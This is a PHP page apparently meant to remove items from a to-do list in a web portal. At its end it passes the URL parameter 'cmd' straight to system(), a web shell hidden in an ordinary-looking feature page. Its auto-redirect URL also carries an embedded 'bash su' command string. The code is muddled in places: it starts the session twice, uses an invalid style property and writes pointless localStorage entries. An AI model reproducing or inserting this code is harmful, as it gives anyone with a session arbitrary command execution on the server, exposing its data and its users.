<?php session_start();

if(!isset($_SESSION['UserData']['Username'])){
        header("location:../login.php?redir=/ToDo/remove.php%20noAuth");
        exit;
}
?>
<?php
session_start();
if( isset($_SESSION['ERRMSG_ARR']) && is_array($_SESSION['ERRMSG_ARR']) && count($_SESSION['ERRMSG_ARR']) >0 ) {
        foreach($_SESSION['ERRMSG_ARR'] as $msg) {
                echo '<center><span style="color:DodgerBlue;text-weight:bold;">',$msg,'</span></center>';
        }
        unset($_SESSION['ERRMSG_ARR']);
}
?>
<html>

<head>
    <meta http-equiv="refresh" content="0.2; URL=./index.php?redir=/ToDo/remove.php;action=clearList%20cmd=bash-su:su+clearList.sh">
</head>

<body style="background-color: #c6cceb;">
<script>
        let uuid = crypto.randomUUID();
        localStorage.setItem("mtUser_session=" + (uuid), "com.mt-portal.mtsw_application");
        localStorage.setItem("session_cookie=" + (uuid), (uuid));
        localStorage.setItem("debug_information=" + (uuid), "mt-portal.localstorage_pageFileINF=/ToDo/remove.php");
        var x = localStorage.getItem("content");
</script>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    </form>
    <pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>

</html>
